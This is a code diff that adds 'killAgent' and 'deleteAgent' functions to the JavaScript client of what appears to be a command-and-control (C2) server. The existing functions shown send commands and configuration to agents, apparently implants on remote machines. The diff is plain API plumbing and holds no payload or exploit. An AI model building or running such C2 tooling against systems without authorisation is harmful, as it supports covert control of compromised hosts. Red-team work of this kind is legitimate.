@@ -58,6 +58,32 @@ export var sendConfig = async (id,command) => {
 
 }
 
+export var killAgent = async (id) => {
+
+    const request = await axios.get(`${C2_ENDPOINT}/api/killagent/${id}`, {headers: {
+        'Content-Type': 'application/json'
+      }, withCredentials: true })
+        .then(response => response.data);
+    console.log(request)
+    return {
+        payload: request
+    }
+
+}
+
+export var deleteAgent = async (id) => {
+
+    const request = await axios.get(`${C2_ENDPOINT}/api/deleteagent/${id}`, {headers: {
+        'Content-Type': 'application/json'
+      }, withCredentials: true })
+        .then(response => response.data);
+    console.log(request)
+    return {
+        payload: request
+    }
+
+}
+
 export var sendCommand = async (id,command) => {
 
     const request = await axios.post(`${C2_ENDPOINT}/api/agent/${id}`,command, {headers: {
